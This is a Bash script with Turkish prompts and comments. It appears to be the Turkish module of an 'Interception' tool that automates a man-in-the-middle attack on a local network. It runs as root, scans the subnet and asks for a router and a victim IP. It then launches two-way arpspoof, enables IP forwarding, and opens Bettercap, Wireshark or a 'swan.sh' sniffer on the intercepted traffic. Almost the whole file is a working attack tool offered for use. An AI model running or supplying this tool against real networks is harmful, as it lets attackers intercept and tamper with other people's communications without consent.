#!/bin/bash

function LineDrawForExternalline()
{
	for (( i=0; i<105; i++ )) 
	{
		printf "-"
  	}
	echo ""
}

if [[ $(id -u) -eq 0 ]]; then
	
	function TR_allcodefiles()
	{
		# Türkçe kodların oldugu bu dosyayı ana dosyamın içine çagırıp orada kullanacagım.
     		# Dosyamı (Türkçe) kısmını buradan da kullanabilirim ama pek saglıklı olacagını düşünmedigimden 
     		# dosyayı Ana dosyanın (İnterception) içinde çagırıp orada kullanacagım böylelikle ana dosyamdaki kod yıgınını azaltacagım
     		# hemde istedigim zaman dil dosyaları arasında güncelleme, ekleme, çıkarma vs gibi işlemleri hızlı ve kolaylıka yapabilecegim.
     	
     		function LineDrawForInternalLine() 
		{
        		for (( i=0; i<105; i++ )) 
        		{
          			printf "-"
        		}
        		echo ""
     		}
     	
		# Saldırının başlatıldığı ilk nokta //
	      	printf "MİTM Saldırısı yapmak ister misiniz? | \e[1;32mE\e[0m | <| |> | \e[1;32mh\e[0m | : "
	    	read ProgramReply1
	     	LineDrawForInternalLine
     	
	     	if [[ $ProgramReply1 == "E" ]]; then
			clear
			LineDrawForInternalLine
			printf "Dinlemeye başlanacak aralık degerini ğiriniz ( Örnek = \e[1;32m10.0.2.0\e[0m <| |> \e[1;32m192.168.1.0\e[0m ) : "
			read IPBetweenReply
			LineDrawForInternalLine
			
			printf "\nSubnetMask degerini giriniz ( Örnek = \e[1;32m24\e[0m ) : " 
			read SubnetMaskValue
			LineDrawForInternalLine
			
			if [[ $SubnetMaskValue -gt 0 ]] && [[ $SubnetMaskValue -lt 32 ]]; then
				printf "\nGirdiginiz Subnetmask degeri \e[1;32m$SubnetMaskValue\e[0m dir // uygun aralıktadır\n"
			else
				printf "\nGirdiginiz deger \e[1;31m$SubnetMaskValue\e[0m dir\nuygun aralıkta degildir\nsistem otomatik olarak bir deger tanımladı\n" 
				SubnetMaskValue=24
			fi		
			
			LineDrawForInternalLine
			
		   	printf "\nBu işlem biraz zaman alabilir\nNetwork Discover yapılacak\n"
		   	sleep 5
	  
			service NetworkManager restart
	 
	  		# Gnome-Terminal komutu sayesinde ag taraması - netdiscover komutunu yeni
	  		# bir terminale yönlendirebiliyorum ve komut dosyamı bozmuyorum. 
	  		clear
	  		LineDrawForInternalLine
				
	  	#gnome-terminal --geometry=78x16+0+0 --window \
	  	#--working-directory=/depot --title='.: Ag taraması :.' --command="python3 netdis.py -i $IPBetweenReply -s $SubnetMaskValue" \
	  
	  		python3 netdis.py -i $IPBetweenReply -s $SubnetMaskValue
			sleep 5
	  
	  		printf "\nDinlenecek Router//cihaz Ip adresini giriniz : "
	  		read RouterIpAdressValue
	  		LineDrawForInternalLine
	 
	  		# Gnome-Terminal komutu sayesinde ag taraması - netdiscover komutunu yeni
	  		# bir terminale yönlendirebiliyorum ve komut dosyamı bozmuyorum.
	  
	  	#gnome-terminal --geometry=78x16+1000+0 --window \
	  	#--working-directory=/depot --title='.: Ag taraması (Saldırı için) :.' --command="python3 netdis.py -i $IPBetweenReply -s $SubnetMaskValue" \
				
			python3 netdis.py -i $IPBetweenReply -s $SubnetMaskValue
			sleep 5
	  		printf "\nSaldırmak istediginiz kişinin IP adresini giriniz : "
	  		read AttackPersonIpAddress
	  		LineDrawForInternalLine

			printf "\n"
	  		iwconfig
	   		printf "Kullanacagınız arayüzünü giriniz ( Örnek : \e[1;36mwlan0\e[0m || \e[1;36meth0\e[0m ) : "
	   		read AllInterfaces

	   		printf "\n\e[1;36mArayüzünüz0\e[0m : $AllInterfaces\n"
	   		LineDrawForInternalLine
	  
	   		printf "MITM başlatılıyor . . .\nRouter//Cihaz >>> Hedef saldırısı başlatılıyor . . .\nRouter//Cihaz >>> Hedef saldırısı başlatıldı\n"
	   		LineDrawForInternalLine
	 
	  		# Gnome-Terminal ile aynı şekilde yeni arp saldırısını ( router >>> kurban seklinde )
	  		# yeni bir terminale yönlendiriyorum böylelikle arp verilerini yeni bir tablodan okunabilmelerini sağlamakyatım.

	   		sleep 1
	   		clear
		 
	   	gnome-terminal --geometry=78x16+0+500 --window \
	   	--working-directory=/depot --title=' .: Saldırı 1 :.' --command="arpspoof -i $AllInterfaces -t $RouterIpAdressValue $AttackPersonIpAddress" \
		
			sleep 1
	   		printf "\nHedef >>> Router//Cihaz saldırısı başlatılıyor . . .\nHedef >>> Router//Cihaz saldırısı başlatıldı\n"
	   		LineDrawForInternalLine
	  
	  		# Gnome-Terminal ile aynı şekilde yeni arp saldırısını ( Hedef >>> router seklinde )
	  		# yeni bir terminale yönlendiriyorum böylelikle arp verilerini yeni bir tablodan okunabilmelerini sağlamakyatım.
	  
	   	gnome-terminal --geometry=78x16+1000+500 --window \
	   	--working-directory=/depot/kn --title='.: Saldırı 2 :.' --command="arpspoof -i $AllInterfaces -t $AttackPersonIpAddress $RouterIpAdressValue" \
	   
	   		printf "Hedef -> Router//Cihaz saldırısı yapılıyor . . .\n"
	   		sleep 1
	   		clear
				
			printf "\e[1;34mIP forward\e[0m başlatılıyor . . .\n"
			# 'echo 1 > ... ifadesi ip verilerini forwardlamamızı yani gelen veya giden verileri'
			# yönlendirme yaparak gitmeleri gereken yönlere iletmemizi sağlamaktadır.
		     
		     	echo 1 > /proc/sys/net/ipv4/ip_forward
	    		printf "\e[1;34mIP forward\e[0m yapılıyor . . .\n"
			LineDrawForInternalLine
			sleep 5
			clear
	    
			printf "Dinleyici çalıştırmak ister misiniz? | \e[1;34mE\e[0m | <| |> | \e[1;34mh\e[0m | : "
			read listener_reply
			LineDrawForInternalLine
	       
				if [[ $listener_reply == "E" ]]; then
			  	       	printf "[ \e[1;34mWireshark\e[0m <| |> \e[1;34mBettercap\e[0m <| |> \e[1;34mSwan\e[0m ]\n\n"
			  	       	printf "(1) \e[1;32mBettercap\e[0m\n"
					printf "(2) \e[1;32mWireshark\e[0m\n"
					printf "(3) \e[1;32mSwan\e[0m\n"
		  			printf "\nKullanılacak dinleyici aracı seçiniz : "
			  	       	read listener_type
		               		LineDrawForInternalLine
		   
		  	       		case $listener_type in   
		  
		  	       		1 )

			  	       	service NetworkManager restart
			  	       	printf "\e[1;31mBettercap\e[0m çalıştırılıyor\n"
			  	       	LineDrawForInternalLine
			  	       	gnome-terminal --geometry=167x39+0+0 --window \
			  	       	--working-directory=/depot/kn --title='.: Bettercap ekranı :.' --command="bettercap -iface $AllInterfaces" \
			  
			  	       	;;
		  
		  	       		2 )
		  	       
			  	      	printf "\e[1;36mWireshark\e[0m çalıştırılıyor . . .\n"
			  	       	LineDrawForInternalLine
			  	       	wireshark
			  	       	printf "\n\e[1;36mWireshark\e[0m kapatılıldı\n"
			  	       	echo ""
			  	       
			  	       	;;
		  	       
		  	       		3 )
							
					clear
			  	       	printf "\e[1;36mswan\e[0m çalıştırılıyor\n"
			  	       	sleep 3
			  	       	clear
			  	       	chmod +x swan.sh
			  	       	./swan.sh
			  	       	printf "\nSwan kapatıldı\n"
			  	       
			  	       	;;
		   
			  	       	* )

			  	       	printf "Hatalı deger girdiniz.\nProgram kapatılıyor . . .\n\n"
		       		       	sleep 3
		       		       	printf "Program tekrardan başlatıcak . . .\n"
		       		       	LineDrawForInternalLine
		       		      	sleep 5
		       		       	clear
		       		       	chmod +x Interception.sh
		  	               	./Interception.sh
			  	       
			  	       	;;
		  
		  	      		esac
		  
	       		  	elif [[ $listener_reply == "h" ]]; then
	       		  		printf "***** Dinleyici seçilmedi *****\n"
	       		  			
	       		  	else
	       		  		printf "Hatalı işlem yaptınız\nProgram kapatılıyor . . .\n\n"
	       		  		sleep 3
	  	          		printf "Program tekrardan başlatıcak . . .\n"
	       		  		LineDrawForInternalLine
	       		 		sleep 5
	       		  		clear
	       		  		chmod +x Interception.sh
	  	          		./Interception.sh
	      		  	fi
	    
	    		  LineDrawForInternalLine
	    	
	    		# Buradaki echo 0 ifadesi yapılan tüm ip forward işlemlerini durdurmaktadır.
	    		# Linux içinde echo 0 ve 1 olmak üzere açılan ve kapanan bir ip forward dosya mevcuttur
	    		# böylelikle sistemimizi yoracak tüm işlemlerden kaçınmamızı sağlamaktadır.
			# Ayrıca saldırı işlemlerinin sonlandığı nokta olarak adlandırabiliriz. 
		       
		     	printf "\e[1;36mIp forward\e[0m kapatılıyor . . .\n"
	    	     	echo 0 > /proc/sys/net/ipv4/ip_forward
		    	printf "\e[1;36mIp forward\e[0m kapatıldı\n\n"
	    	     	sleep 3
	    	     	LineDrawForInternalLine
			
		elif [[ $ProgramReply1 == "h" ]]; then
			printf "MITM saldırısı yapılmayacaktır\n"
	  		sleep 2
	  		printf "Program kapatılıyor . . .\nProgram kapatıldı\n\n"
	  		LineDrawForInternalLine
	  	
	 	else 
	  		printf "\nHatalı tuşlama yaptınız\nProgram kapatılıyor . . .\nProgram kapatıldı\n\n"
	  		sleep 3
	  		printf "Program tekrardan başlatıcak . . .\n"
	  		LineDrawForInternalLine
	  		sleep 5
	  		clear
	  		chmod +x Interception.sh
	  		./Interception.sh
	  	fi
	}
	
	TR_allcodefiles

elif [[ $(id -u) -ne 0 ]]; then
	LineDrawForExternalline
	printf "\n\e[1;31m\t\t\t\tRoot\e[0m yetkisine sahip değilsiniz\n\t\t\t\t\e[1;31mRoot\e[0m olarak çalıştırınız\n\n"
	LineDrawForExternalline
   	exit
	
fi
